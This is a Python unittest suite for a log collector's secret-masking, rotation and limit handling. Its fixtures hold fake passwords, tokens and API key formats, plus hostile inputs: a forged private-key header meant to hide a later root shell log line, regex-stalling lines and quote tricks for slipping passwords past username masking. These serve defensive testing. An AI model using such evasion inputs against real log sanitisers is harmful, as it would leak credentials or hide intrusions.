"""Collector module, masking and limit tests against fixture directories.

Standard library `unittest` only, Python 3.9 compatible, like
test_collector.py. The collector is loaded from its file and pointed at a
temporary directory laid out like a server (its ROOT), which only tests can do.
"""

import base64
import datetime
import errno
import gzip
import hashlib
import importlib.util
import io
import json
import os
import shutil
import socket
import struct
import subprocess
import sys
import tempfile
import time
import unittest
from pathlib import Path

COLLECTOR = Path(__file__).resolve().parents[2] / "checker" / "collector" / "collector.py"
NOW = time.time()
DAY = 86400


def load_collector(root):
    spec = importlib.util.spec_from_file_location("collector_under_test", COLLECTOR)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    module.ROOT = root
    # Don't renice the test runner itself; priority has its own test.
    module.lower_priority = lambda: {"nice": None, "io": "unchanged"}
    return module


def settings(modules, days=30, source_bytes=1 << 20, module_seconds=60, home_text=None):
    since = datetime.datetime.now(datetime.timezone.utc) - datetime.timedelta(days=days)
    value = {
        "protocol": 1,
        "run_id": "t",
        "since": since.isoformat(),
        "modules": modules,
        "limits": {
            "overall_seconds": 120,
            "module_seconds": module_seconds,
            "source_bytes": source_bytes,
        },
    }
    if home_text is not None:
        value["home_text"] = home_text
    return json.dumps(value)


def collect(root, modules, **kwargs):
    collector = load_collector(root)
    out = io.BytesIO()
    collector.main(settings(modules, **kwargs), out=out)
    return [json.loads(line) for line in gzip.decompress(out.getvalue()).splitlines()]


def sources(records):
    """Reassemble every source: {name: (start, content bytes, end)}."""
    starts, data, result = {}, {}, {}
    for record in records:
        if record["type"] == "source_start":
            starts[record["source_id"]] = record
            data[record["source_id"]] = b""
        elif record["type"] == "chunk":
            if record["encoding"] == "base64":
                piece = base64.b64decode(record["data"])
            else:
                piece = record["data"].encode("utf-8")
            data[record["source_id"]] += piece
        elif record["type"] == "source_end":
            start = starts[record["source_id"]]
            result[start["name"]] = (start, data[record["source_id"]], record)
    return result


def named(records, name):
    return [r for r in records if r["type"] == "record" and r["name"] == name]


class FixtureRoot(unittest.TestCase):
    def setUp(self):
        self.root = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, self.root)

    def write(self, relative, data, age_days=0.0):
        target = Path(self.root, relative)
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_bytes(data)
        when = NOW - age_days * DAY
        os.utime(target, (when, when))
        return target


RHEL_SECURE = (
    b"Oct 25 09:01:02 web01 sshd[812]: Accepted publickey for jch from 203.0.113.5 port 52114"
    b" ssh2: ED25519 SHA256:abc\n"
    b"Oct 25 09:02:10 web01 sudo[901]: jch : TTY=pts/0 ; PWD=/home/jch ; USER=root ;"
    b" COMMAND=/usr/bin/mysql -u root -pS3cretPw\n"
)
UBUNTU_AUTH = (
    b"2026-10-25T09:01:02.123456+00:00 web02 sshd[812]: Failed password for root from"
    b" 198.51.100.7 port 4711 ssh2\n"
    b"2026-10-25T09:03:00.000000+00:00 web02 sudo[903]: jch : COMMAND=/usr/bin/curl"
    b" https://deploy:hunter2@example.com/hook\n"
)


class AuthLogTests(FixtureRoot):
    def test_rhel_layout_respects_the_window(self):
        self.write("var/log/secure", RHEL_SECURE)
        self.write("var/log/secure-20261018", b"older but in window\n", age_days=7)
        self.write("var/log/secure-20260801", b"before the window\n", age_days=85)
        records = collect(self.root, ["auth_log"])
        sent = sources(records)
        self.assertEqual(sorted(sent), ["/var/log/secure", "/var/log/secure-20261018"])
        summary = named(records, "summary")[0]["data"]
        self.assertEqual(summary, {"files_found": 3, "files_sent": 2, "files_before_window": 1})
        self.assertEqual(records[-1]["status"], "complete")

    def test_sources_are_sent_oldest_first(self):
        self.write("var/log/secure", RHEL_SECURE)
        self.write("var/log/secure-20261018", b"older\n", age_days=7)
        names = [r["name"] for r in collect(self.root, ["auth_log"]) if r["type"] == "source_start"]
        self.assertEqual(names, ["/var/log/secure-20261018", "/var/log/secure"])

    def test_ubuntu_layout_decompresses_rotations(self):
        self.write("var/log/auth.log", UBUNTU_AUTH)
        self.write("var/log/auth.log.1", b"yesterday\n", age_days=1)
        self.write("var/log/auth.log.2.gz", gzip.compress(b"two days ago\n"), age_days=2)
        sent = sources(collect(self.root, ["auth_log"]))
        start, content, end = sent["/var/log/auth.log.2.gz"]
        self.assertEqual(start["meta"]["compressed"], "gzip")
        self.assertEqual(content, b"two days ago\n")
        self.assertEqual(end["bytes"], len(b"two days ago\n"))

    def test_secrets_are_masked_and_counted(self):
        self.write("var/log/secure", RHEL_SECURE)
        self.write("var/log/auth.log", UBUNTU_AUTH)
        sent = sources(collect(self.root, ["auth_log"]))
        _, content, end = sent["/var/log/secure"]
        self.assertNotIn(b"S3cretPw", content)
        self.assertIn(b"-p[MASKED:mysql_password]", content)
        self.assertIn(b"PWD=/home/jch", content)  # sudo's working directory is kept
        self.assertEqual(end["masked"], {"mysql_password": 1})
        _, content, end = sent["/var/log/auth.log"]
        self.assertNotIn(b"hunter2", content)
        self.assertIn(b"Failed password for root", content)
        self.assertEqual(end["masked"], {"url_password": 1})

    def test_file_metadata(self):
        target = self.write("var/log/secure", RHEL_SECURE)
        os.chmod(target, 0o600)
        start, _, _ = sources(collect(self.root, ["auth_log"]))["/var/log/secure"]
        meta = start["meta"]
        self.assertEqual(meta["size"], len(RHEL_SECURE))
        self.assertEqual(meta["mode"], "0600")
        self.assertIsNone(meta["compressed"])
        self.assertEqual(meta["inode"], os.stat(target).st_ino)

    def test_size_cap_truncates(self):
        self.write("var/log/secure", b"x" * 99 + b"\n" + b"y" * 900 + b"\n")
        _, content, end = sources(collect(self.root, ["auth_log"], source_bytes=100))[
            "/var/log/secure"
        ]
        self.assertEqual(end["bytes"], 100)
        self.assertTrue(end["truncated"])
        self.assertEqual(end["truncated_reason"], "size")
        self.assertEqual(len(content), 100)

    def test_exactly_at_cap_is_not_truncated(self):
        self.write("var/log/secure", b"z" * 99 + b"\n")
        _, _, end = sources(collect(self.root, ["auth_log"], source_bytes=100))["/var/log/secure"]
        self.assertFalse(end["truncated"])

    def test_large_file_is_chunked_in_order(self):
        line = b"Oct 25 09:00:00 web01 sshd[1]: Connection closed by 192.0.2.1 port 22\n"
        data = line * 4000  # about 280 KiB
        self.write("var/log/secure", data)
        records = collect(self.root, ["auth_log"])
        chunks = [r for r in records if r["type"] == "chunk"]
        self.assertGreaterEqual(len(chunks), 4)
        self.assertEqual([c["seq"] for c in chunks], list(range(len(chunks))))
        self.assertEqual(sources(records)["/var/log/secure"][1], data)

    def test_non_utf8_content_travels_as_base64(self):
        self.write("var/log/secure", b"latin-1 \xe9t\xe9\n")
        records = collect(self.root, ["auth_log"])
        chunk = [r for r in records if r["type"] == "chunk"][0]
        self.assertEqual(chunk["encoding"], "base64")
        self.assertEqual(sources(records)["/var/log/secure"][1], b"latin-1 \xe9t\xe9\n")

    def test_log_linked_to_dev_null_is_reported_not_read(self):
        Path(self.root, "var/log").mkdir(parents=True)
        os.symlink("/dev/null", Path(self.root, "var/log/auth.log"))
        records = collect(self.root, ["auth_log"])
        unreadable = named(records, "unreadable_file")[0]["data"]
        self.assertEqual(unreadable["path"], "/var/log/auth.log")
        self.assertEqual(unreadable["file_type"], "l")
        self.assertEqual(unreadable["link_target"], "/dev/null")
        self.assertEqual(sources(records), {})

    def test_fifo_does_not_hang_the_collector(self):
        Path(self.root, "var/log").mkdir(parents=True)
        os.mkfifo(Path(self.root, "var/log/secure"))
        started = time.monotonic()
        records = collect(self.root, ["auth_log"])
        self.assertLess(time.monotonic() - started, 10)
        self.assertEqual(named(records, "unreadable_file")[0]["data"]["file_type"], "p")

    def test_time_limit_stops_the_module(self):
        self.write("var/log/secure", RHEL_SECURE)
        records = collect(self.root, ["auth_log"], module_seconds=1e-9)
        trailer = records[-1]
        self.assertEqual(trailer["modules"]["auth_log"]["status"], "timeout")
        self.assertEqual(trailer["status"], "partial")

    def test_no_auth_logs_at_all(self):
        Path(self.root, "var/log").mkdir(parents=True)
        records = collect(self.root, ["auth_log"])
        self.assertEqual(named(records, "summary")[0]["data"]["files_found"], 0)
        self.assertEqual(records[-1]["status"], "complete")

    def test_reading_leaves_files_untouched(self):
        target = self.write("var/log/secure", RHEL_SECURE)
        old_atime = NOW - 3 * DAY  # older than mtime: relatime would update it
        os.utime(target, (old_atime, NOW))
        before = os.stat(target)
        collect(self.root, ["auth_log"])
        after = os.stat(target)
        self.assertEqual(
            (before.st_mtime, before.st_ctime, before.st_size, before.st_atime),
            (after.st_mtime, after.st_ctime, after.st_size, after.st_atime),
        )


class AuthLogReviewTests(FixtureRoot):
    """Cases from the Copilot review of PR #5."""

    def test_secret_in_a_line_longer_than_a_chunk_is_masked(self):
        self.write("var/log/secure", b" " * 65532 + b"password=hunter2\n")
        _, content, end = sources(collect(self.root, ["auth_log"]))["/var/log/secure"]
        self.assertNotIn(b"hunter2", content)
        self.assertEqual(end["masked"], {"password": 1})

    def test_oversized_lines_are_withheld_not_sent_unmasked(self):
        collector = load_collector(self.root)
        collector.MAX_LINE = 50
        self.write("var/log/secure", b"short\n" + b"x" * 120 + b" password=hunter2\nnext\n")
        out = io.BytesIO()
        collector.main(settings(["auth_log"]), out=out)
        records = [json.loads(line) for line in gzip.decompress(out.getvalue()).splitlines()]
        _, content, end = sources(records)["/var/log/secure"]
        self.assertEqual(content, b"short\n[MASKED:oversized_line 138 bytes]\nnext\n")
        self.assertEqual(end["bytes"], 6 + 138 + 5)
        self.assertEqual(end["masked"], {"oversized_line": 1})

    def test_compressed_logs_that_cannot_be_opened_are_not_sent_raw(self):
        collector = load_collector(self.root)
        collector._OPENERS.pop(".xz", None)  # as on a Python built without lzma
        self.write("var/log/auth.log.2.xz", b"\xfd7zXZ\x00 compressed bytes")
        self.write("var/log/auth.log.3.zst", b"\x28\xb5\x2f\xfd compressed bytes")
        out = io.BytesIO()
        collector.main(settings(["auth_log"]), out=out)
        records = [json.loads(line) for line in gzip.decompress(out.getvalue()).splitlines()]
        self.assertEqual(sources(records), {})
        unreadable = {r["data"]["path"]: r["data"] for r in named(records, "unreadable_file")}
        self.assertIn("bypass secret masking", unreadable["/var/log/auth.log.2.xz"]["reason"])
        self.assertIn("zstd", unreadable["/var/log/auth.log.3.zst"]["reason"])

    def test_old_symlink_replacing_the_log_is_still_reported(self):
        Path(self.root, "var/log").mkdir(parents=True)
        link = Path(self.root, "var/log/auth.log")
        os.symlink("/dev/null", link)
        old = NOW - 90 * DAY
        os.utime(link, (old, old), follow_symlinks=False)
        records = collect(self.root, ["auth_log"])
        self.assertEqual(named(records, "unreadable_file")[0]["data"]["link_target"], "/dev/null")

    def test_unlistable_log_directory_is_an_error_not_ok(self):
        records = collect(self.root, ["auth_log"])  # no var/log at all
        self.assertEqual(records[-1]["modules"]["auth_log"]["status"], "error")
        self.assertEqual(records[-1]["status"], "partial")


class HostFactsTests(FixtureRoot):
    def test_records_from_fixture_files(self):
        self.write(
            "etc/os-release",
            b'NAME="Rocky Linux"\nID="rocky"\nVERSION_ID="9.6"\nID_LIKE="rhel centos fedora"\n',
        )
        self.write("etc/machine-id", b"0123456789abcdef0123456789abcdef\n")
        self.write("proc/uptime", b"86400.50 170000.00\n")
        self.write("proc/stat", b"cpu  1 2 3\nbtime 1792900000\n")
        self.write("proc/sys/kernel/tainted", b"4096\n")
        self.write("proc/meminfo", b"MemTotal:        4015636 kB\nMemFree: 1 kB\n")
        self.write("sys/fs/selinux/enforce", b"1")
        records = collect(self.root, ["host_facts"])
        facts = {r["name"]: r["data"] for r in records if r["type"] == "record"}
        self.assertEqual(facts["os_release"]["ID"], "rocky")
        self.assertEqual(facts["os_release"]["ID_LIKE"], "rhel centos fedora")
        self.assertEqual(facts["machine_id"]["machine_id"], "0123456789abcdef0123456789abcdef")
        self.assertEqual(facts["uptime"]["seconds"], 86400.5)
        self.assertTrue(facts["uptime"]["boot_time"].startswith("2026-10-25"))
        self.assertEqual(facts["kernel_taint"]["value"], 4096)
        self.assertEqual(facts["hardware"]["memory_kb"], 4015636)
        self.assertEqual(facts["mandatory_access_control"]["selinux"], "enforcing")
        self.assertIsNone(facts["mandatory_access_control"]["apparmor_enabled"])
        self.assertEqual(records[0]["host"]["os_id"], "rocky")

    def test_time_limit_stops_the_module(self):
        records = collect(self.root, ["host_facts"], module_seconds=1e-9)
        self.assertEqual(records[-1]["modules"]["host_facts"]["status"], "timeout")

    def test_missing_files_give_nulls_not_failures(self):
        records = collect(self.root, ["host_facts"])
        facts = {r["name"]: r["data"] for r in records if r["type"] == "record"}
        self.assertEqual(facts["os_release"], {})
        self.assertIsNone(facts["machine_id"]["machine_id"])
        self.assertIsNone(facts["kernel_taint"]["value"])
        self.assertEqual(records[-1]["status"], "complete")


class MaskingTests(unittest.TestCase):
    def setUp(self):
        self.collector = load_collector("/")
        # The local accounts the unknown_user rule keeps (not this machine's).
        self.collector._LOCAL_ACCOUNT_NAMES = frozenset({b"root", b"jch"})

    def mask(self, text):
        return self.collector.mask_text(text)

    def test_ordinary_log_lines_are_untouched(self):
        for line in (
            b"sshd[1]: Failed password for invalid user jch from 192.0.2.9 port 22 ssh2\n",
            b"sudo: pam_unix(sudo:auth): auth could not identify password for [jch]\n",
            b"sudo: jch : TTY=pts/0 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl\n",
            b"sshd[2]: Accepted publickey for jch from 192.0.2.9 port 5 ssh2: ED25519 SHA256:x\n",
            b"passwd[3]: pam_unix(passwd:chauthtok): password changed for jch\n",
            b"sshd[4]: pam_unix(sshd:auth): authentication failure; logname= uid=0 rhost=x\n",
            b"sshd[5]: Postponed keyboard-interactive/pam for jch from 192.0.2.9 port 5\n",
        ):
            self.assertEqual(self.mask(line), (line, {}), line)

    def test_failed_login_names_are_kept_only_for_local_accounts(self):
        cases = {
            b"sshd[1]: Invalid user Summer2026! from 192.0.2.9 port 22\n": (
                b"sshd[1]: Invalid user [MASKED:unknown_user] from 192.0.2.9 port 22\n"
            ),
            b"sshd[1]: Failed password for invalid user two words from 192.0.2.9 port 22 ssh2\n": (
                b"sshd[1]: Failed password for invalid user [MASKED:unknown_user] from"
                b" 192.0.2.9 port 22 ssh2\n"
            ),
            b"sshd[1]: Connection closed by invalid user hunter2 192.0.2.9 port 22 [preauth]\n": (
                b"sshd[1]: Connection closed by invalid user [MASKED:unknown_user] 192.0.2.9"
                b" port 22 [preauth]\n"
            ),
            b"sshd[1]: Invalid user root from 192.0.2.9 port 22\n": (
                b"sshd[1]: Invalid user root from 192.0.2.9 port 22\n"
            ),
            b"login[2]: FAILED LOGIN 1 FROM tty1 FOR 'Pa ss', User not known to the module\n": (
                b"login[2]: FAILED LOGIN 1 FROM tty1 FOR [MASKED:unknown_user], User not known"
                b" to the module\n"
            ),
            b"login[2]: FAILED LOGIN 1 FROM tty1 FOR 'jch', Authentication failure\n": (
                b"login[2]: FAILED LOGIN 1 FROM tty1 FOR 'jch', Authentication failure\n"
            ),
            b"su[3]: user Secret99 does not exist\n": (
                b"su[3]: user [MASKED:unknown_user] does not exist\n"
            ),
            b"sshd[4]: pam_sss(sshd:auth): received for user Xyz123: 10 (User not known)\n": (
                b"sshd[4]: pam_sss(sshd:auth): received for user [MASKED:unknown_user]: 10"
                b" (User not known)\n"
            ),
        }
        for line, expected in cases.items():
            self.assertEqual(self.mask(line)[0], expected, line)

    def test_failed_login_names_are_masked_whole(self):
        # A typed password can hold spaces, colons and quotes: the whole name
        # up to its message's boundary is masked, never just a first word.
        cases = {
            b"sshd[1]: Connection closed by invalid user two words 192.0.2.9 port 22 [preauth]\n": (
                b"sshd[1]: Connection closed by invalid user [MASKED:unknown_user] 192.0.2.9"
                b" port 22 [preauth]\n"
            ),
            b"sshd[1]: Disconnected from invalid user pass word [preauth]\n": (
                b"sshd[1]: Disconnected from invalid user [MASKED:unknown_user] [preauth]\n"
            ),
            b"login[2]: FAILED LOGIN 1 FROM tty1 FOR 'root'hunter2', User not known\n": (
                b"login[2]: FAILED LOGIN 1 FROM tty1 FOR [MASKED:unknown_user], User not known\n"
            ),
            b"su[3]: user two words does not exist or the user entry is bad\n": (
                b"su[3]: user [MASKED:unknown_user] does not exist or the user entry is bad\n"
            ),
            b"sshd[4]: pam_sss(sshd:auth): received for user a b:c: 10 (User not known)\n": (
                b"sshd[4]: pam_sss(sshd:auth): received for user [MASKED:unknown_user]: 10"
                b" (User not known)\n"
            ),
        }
        for line, expected in cases.items():
            self.assertEqual(self.mask(line)[0], expected, line)

    def test_quotes_never_turn_a_typed_name_into_an_account(self):
        cases = {
            b"login[2]: FAILED LOGIN 1 FROM tty1 FOR 'Alpha17', Omega42', User not known\n": (
                b"login[2]: FAILED LOGIN 1 FROM tty1 FOR [MASKED:unknown_user], User not known\n"
            ),
            b"login[2]: FAILED LOGIN 1 FROM tty1 FOR ''root'', User not known\n": (
                b"login[2]: FAILED LOGIN 1 FROM tty1 FOR [MASKED:unknown_user], User not known\n"
            ),
            b"login[2]: FAILED LOGIN 1 FROM tty1 FOR 'root', Authentication failure\n": (
                b"login[2]: FAILED LOGIN 1 FROM tty1 FOR 'root', Authentication failure\n"
            ),
            b"sshd[1]: Invalid user root' from 192.0.2.9 port 22\n": (
                b"sshd[1]: Invalid user [MASKED:unknown_user] from 192.0.2.9 port 22\n"
            ),
            b"sshd[1]: Invalid user 'root' from 192.0.2.9 port 22\n": (
                b"sshd[1]: Invalid user [MASKED:unknown_user] from 192.0.2.9 port 22\n"
            ),
        }
        for line, expected in cases.items():
            self.assertEqual(self.mask(line)[0], expected, line)

    def test_more_failed_login_formats(self):
        cases = {
            b"login[2]: FAILED LOGIN (1) on '/dev/tty1' FOR 'Summer2026!', Auth failure\n": (
                b"login[2]: FAILED LOGIN (1) on '/dev/tty1' FOR [MASKED:unknown_user],"
                b" Auth failure\n"
            ),
            b"login[2]: FAILED LOGIN (1) on '/dev/pts/0' from 'h' FOR 'x y', User not known\n": (
                b"login[2]: FAILED LOGIN (1) on '/dev/pts/0' from 'h' FOR [MASKED:unknown_user],"
                b" User not known\n"
            ),
            b"sshd[4]: pam_sss(sshd:auth): authentication failure; logname= uid=0 euid=0"
            b" tty=ssh ruser= rhost=192.0.2.9 user=Summer2026!\n": (
                b"sshd[4]: pam_sss(sshd:auth): authentication failure; logname= uid=0 euid=0"
                b" tty=ssh ruser= rhost=192.0.2.9 user=[MASKED:unknown_user]\n"
            ),
            b"sshd[4]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0"
            b" tty=ssh ruser= rhost=192.0.2.9  user=jch\n": (
                b"sshd[4]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0"
                b" tty=ssh ruser= rhost=192.0.2.9  user=jch\n"
            ),
        }
        for line, expected in cases.items():
            self.assertEqual(self.mask(line)[0], expected, line)

    def test_failed_login_rules_stay_fast_on_hostile_lines(self):
        line = b"invalid user " * 50000 + b"\n"
        started = time.monotonic()
        self.mask(line)
        self.assertLess(time.monotonic() - started, 5)

    def test_each_rule(self):
        cases = [
            (b"export DB_PASSWORD=hunter2\n", b"hunter2", "password"),
            (b'{"api_key": "abc123"}\n', b"abc123", "password"),
            (b"db_pwd=x9\n", b"x9", "password"),
            (b"tool --token tok123 --x\n", b"tok123", "password"),
            (b"mysqldump -u root -pPw1 db\n", b"Pw1", "mysql_password"),
            (b"Authorization: Bearer abcdefghij\n", b"abcdefghij", "auth_header"),
            (b"curl -H 'X: Bearer zyxwvutsrq'\n", b"zyxwvutsrq", "bearer_token"),
            (b"git clone https://u:pw42@host/r\n", b"pw42", "url_password"),
            (b"key AKIAABCDEFGHIJKLMNOP\n", b"AKIAABCDEFGHIJKLMNOP", "aws_access_key"),
            (b"ghp_" + b"a" * 36 + b"\n", b"ghp_", "github_token"),
            (b"xoxb-123456789012-abc\n", b"xoxb-", "slack_token"),
            (b"sk_live_" + b"b" * 24 + b"\n", b"sk_live_", "stripe_key"),
            (b"sk-ant-api03-" + b"c" * 30 + b"\n", b"sk-ant-", "anthropic_key"),
            (b"eyJhbGciOiJI.eyJzdWIiOiIx.c2lnbmF0dXJl\n", b"eyJ", "jwt"),
        ]
        for text, secret, kind in cases:
            masked, counts = self.mask(text)
            self.assertNotIn(secret, masked, text)
            self.assertIn(b"[MASKED:" + kind.encode() + b"]", masked, text)
            self.assertEqual(counts, {kind: 1}, text)

    def test_private_key_blocks_across_lines(self):
        text = (
            b"before\n-----BEGIN RSA PRIVATE KEY-----\nMIIEow\nAAAA\n"
            b"-----END RSA PRIVATE KEY-----\nafter\n"
        )
        masked, counts = self.mask(text)
        self.assertEqual(masked, b"before\n[MASKED:private_key]\nafter\n")
        self.assertEqual(counts, {"private_key": 1})

    def test_fake_key_start_cannot_hide_later_lines(self):
        text = (
            b"Oct 26 10:00:00 web01 attacker: -----BEGIN RSA PRIVATE KEY-----\n"
            b"Oct 26 10:00:05 web01 sshd[9]: Accepted password for root from 198.51.100.7\n"
            b"Oct 26 10:00:06 web01 sudo[10]: root : COMMAND=/bin/sh\n"
        )
        masked, counts = self.mask(text)
        self.assertEqual(
            masked,
            b"Oct 26 10:00:00 web01 attacker: [MASKED:private_key]\n" + text.split(b"\n", 1)[1],
        )
        self.assertEqual(counts, {"private_key": 1, "private_key_unterminated": 1})

    def test_key_block_cannot_run_on_forever(self):
        text = b"-----BEGIN RSA PRIVATE KEY-----\n" + b"QUFBQUFB\n" * 300 + b"visible line\n"
        masked, counts = self.mask(text)
        self.assertEqual(masked, b"[MASKED:private_key]\n" + b"QUFBQUFB\n" * 44 + b"visible line\n")
        self.assertEqual(counts["private_key_unterminated"], 1)

    def test_encrypted_key_with_headers_is_masked_whole(self):
        text = (
            b"-----BEGIN RSA PRIVATE KEY-----\nProc-Type: 4,ENCRYPTED\n"
            b"DEK-Info: AES-128-CBC,0123456789ABCDEF\n\nMIIEow==\n"
            b"-----END RSA PRIVATE KEY-----\nafter\n"
        )
        masked, counts = self.mask(text)
        self.assertEqual(masked, b"[MASKED:private_key]\nafter\n")
        self.assertEqual(counts, {"private_key": 1})

    def test_key_logged_line_by_line_keeps_the_log_prefix(self):
        text = (
            b"Oct 26 app[1]: -----BEGIN PRIVATE KEY-----\n"
            b"Oct 26 app[1]: MIIEvQIBADANBgkqhkiG9w0BAQEFAASC\n"
            b"Oct 26 app[1]: -----END PRIVATE KEY-----\n"
        )
        masked, _ = self.mask(text)
        self.assertEqual(
            masked,
            b"Oct 26 app[1]: [MASKED:private_key]\nOct 26 app[1]: [MASKED:private_key]\n"
            b"Oct 26 app[1]: \n",
        )

    def test_fake_key_start_cannot_hide_assignments(self):
        # "=" counts as base64 only as padding at the end.
        for line in (b"COMMAND=/bin/bash\n", b"sudo[10]: root : COMMAND=/bin/bash\n"):
            masked, counts = self.mask(b"-----BEGIN RSA PRIVATE KEY-----\n" + line)
            self.assertEqual(masked, b"[MASKED:private_key]\n" + line, line)
            self.assertEqual(counts["private_key_unterminated"], 1)

    def test_short_last_line_of_a_logged_key_is_masked(self):
        text = (
            b"Oct 26 app[1]: -----BEGIN PRIVATE KEY-----\n"
            b"Oct 26 app[1]: MIIEvQIBADANBgkqhkiG9w0BAQEFAASC\n"
            b"Oct 26 app[1]: AQI=\n"
            b"Oct 26 app[1]: -----END PRIVATE KEY-----\n"
        )
        masked, counts = self.mask(text)
        self.assertNotIn(b"AQI=", masked)
        self.assertEqual(counts, {"private_key": 1})

    def test_other_programs_lines_end_a_logged_key(self):
        text = b"Oct 26 app[1]: -----BEGIN PRIVATE KEY-----\nOct 26 other[2]: QUFBQUFB\n"
        masked, counts = self.mask(text)
        self.assertEqual(
            masked, b"Oct 26 app[1]: [MASKED:private_key]\nOct 26 other[2]: QUFBQUFB\n"
        )
        self.assertEqual(counts["private_key_unterminated"], 1)

    def test_kept_log_prefix_is_masked_too(self):
        text = (
            b"app[1]: -----BEGIN PRIVATE KEY-----\n"
            b"password=hunter2 app[1]: MIIEvQIBADANBgkqhkiG9w0BAQEFAASC\n"
        )
        masked, counts = self.mask(text)
        self.assertEqual(
            masked,
            b"app[1]: [MASKED:private_key]\n"
            b"password=[MASKED:password] app[1]: [MASKED:private_key]\n",
        )
        self.assertEqual(counts["password"], 1)

    def test_sudo_tags_and_pam_flags_are_kept(self):
        # Evidence the sudo and PAM checks compare; none of it can be a secret.
        for line in (
            b"%wheel\tALL=(ALL)\tNOPASSWD: ALL\n",
            b"scanner ALL=(root) NOPASSWD: /usr/bin/python3 -I -B -\n",
            b"deploy ALL=(root) PASSWD: /usr/bin/systemctl\n",
            b"account [success=ok new_authtok_reqd=ok user_unknown=bad default=die] pam_sss.so\n",
            b"auth [success=done authinfo_unavail=ignore auth_err=die default=bad] pam_sss.so\n",
            b"auth [success=2 default=ignore] pam_unix.so\n",
            b"auth required pam_debug.so auth=authinfo_unavail cred=success\n",
        ):
            masked, counts = self.mask(line)
            self.assertEqual((masked, counts), (line, {}), line)

    def test_sudo_tags_are_kept_only_in_sudo_rules(self):
        for kept in (
            b"jch ALL = (root) NOPASSWD:SETENV: /bin/a, PASSWD: /bin/b\n",
            b"#1000 ALL=(ALL) NOPASSWD: ALL\n",
            b"%#27 ALL=(ALL) NOPASSWD: ALL\n",
            b"%:admins ALL = NOPASSWD: ALL\n",
            b"jch 10.0.0.0/8 = (root) NOPASSWD: ALL\n",
        ):
            self.assertEqual(self.mask(kept), (kept, {}), kept)
        for line in (
            b"root ALL=(ALL) ALL # note=PASSWD: hunter2\n",  # in the comment
            b"root ALL=(ALL) /bin/run --x=PASSWD: hunter2\n",  # in the command
            b"app: PASSWD: hunter2\n",
            b"Oct 26 10:00:00 web01 app[7]: NOPASSWD: hunter2\n",
            b"user=bob PASSWD: hunter2\n",
            b"# %wheel ALL=(ALL) NOPASSWD: hunter2\n",
        ):
            masked, counts = self.mask(line)
            self.assertNotIn(b"hunter2", masked, line)
            self.assertEqual(counts, {"password": 1}, line)

    def test_secrets_near_the_exceptions_are_still_masked(self):
        cases = {
            b"auth required pam_debug.so auth=success/S3cret\n": 1,
            b"auth [auth_err=die:S3cret default=bad] pam_sss.so\n": 1,
            b"session optional pam_exec.so /x password=hunter2\n": 1,
            b"auth_err=hunter2 auth=letmein\n": 2,
            b"NOPASSWD=secret passwd: hunter2\n": 2,
            b"new_authtok_reqd=okay2 auth_err=dieXYZ\n": 2,
        }
        for line, hits in cases.items():
            masked, counts = self.mask(line)
            self.assertEqual(counts, {"password": hits}, line)
            for secret in (b"hunter2", b"letmein", b"secret", b"okay2", b"dieXYZ", b"S3cret"):
                self.assertNotIn(secret, masked, line)

    def test_password_hashes_are_masked_anywhere(self):
        hashes = (
            b"$1$abcdefgh$" + b"w" * 22,
            b"$2b$12$" + b"a" * 53,
            b"$5$rounds=5000$saltsaltsalt$" + b"z" * 43,
            b"$6$saltsalt$" + b"x" * 86,
            b"$7$CU..../....saltsalt$" + b"s" * 43,
            b"$y$j9T$abcdefghijklmnop$" + b"Q" * 43,
            b"$gy$j9T$abcdefghijklmnop$" + b"Q" * 43,
            # Unusual but valid: empty and non-base64 salts, a long scrypt salt.
            b"$6$$" + b"x" * 86,
            b"$6$a-b_c$" + b"x" * 86,
            b"$1$a_b$" + b"w" * 22,
            b"$y$j9T$$" + b"Q" * 43,
            b"$md5$$$" + b"m" * 22,
            b"$7$CU..../...." + b"s" * 86 + b"$" + b"h" * 43,
        )
        for value in hashes:
            for line in (
                b"copied:" + value + b":20000:0:99999:7:::\n",
                b"locked:!" + value + b":20000::\n",
                b"note " + value + b" end\n",
            ):
                masked, counts = self.mask(line)
                self.assertNotIn(value[-16:], masked, line)
                self.assertEqual(counts, {"password_hash": 1}, line)

    def test_hash_inside_a_credential_keeps_the_whole_value_masked(self):
        masked, _ = self.mask(b"password=$6$saltsalt$" + b"x" * 86 + b"!PlainTail\n")
        self.assertEqual(masked, b"password=[MASKED:password]\n")

    def test_hash_attached_to_an_option_is_masked(self):
        line = b"COMMAND=/usr/sbin/usermod -p$6$saltsalt$" + b"x" * 86 + b" alice\n"
        masked, counts = self.mask(line)
        self.assertEqual(masked, b"COMMAND=/usr/sbin/usermod -p[MASKED:password_hash] alice\n")
        self.assertEqual(counts, {"password_hash": 1})

    def test_hostile_hash_fragments_mask_in_linear_time(self):
        # A 1 MiB line of almost-hashes must not stall the collector (limits
        # are checked between lines). The old pattern took ~0.8 s on 28 KiB.
        for fragment in (
            b",$6$abc",
            b"$y$j9T$",
            b"$2b$12$",
            b"$7$abc$",
            b"$md5,rounds=1$",
            b"$1$$",
        ):
            line = fragment * (1024 * 1024 // len(fragment)) + b"\n"
            started = time.monotonic()
            self.mask(line)
            self.assertLess(time.monotonic() - started, 2.0, fragment)

    def test_dollar_text_that_is_not_a_hash_is_kept(self):
        for line in (b"price is $1$ and $6$ total\n", b"PS1='\\$ ' $HOME/$USER\n"):
            self.assertEqual(self.mask(line), (line, {}), line)

    def test_quoted_values_are_masked_whole(self):
        for text in (
            b'password="first second" x\n',
            b"tool --password 'first second' y\n",
            b'secret: "with \\" escaped quote" z\n',
        ):
            masked, counts = self.mask(text)
            self.assertNotIn(b"first", masked, text)
            self.assertNotIn(b"second", masked, text)
            self.assertNotIn(b"escaped", masked, text)
            self.assertEqual(counts, {"password": 1}, text)

    def test_quoted_mysql_passwords_are_masked_whole(self):
        cases = [
            (
                b"mysql -u root -p'first second' db\n",
                b"mysql -u root -p[MASKED:mysql_password] db\n",
            ),
            (b'mysqldump -p"a b" x\n', b"mysqldump -p[MASKED:mysql_password] x\n"),
        ]
        for text, expected in cases:
            self.assertEqual(self.mask(text), (expected, {"mysql_password": 1}), text)

    def test_secrets_beside_a_key_block_are_masked(self):
        masked, counts = self.mask(
            b"token=hunter2 -----BEGIN PRIVATE KEY-----\nMII\n"
            b"-----END PRIVATE KEY----- password=zz9\n"
        )
        self.assertNotIn(b"hunter2", masked)
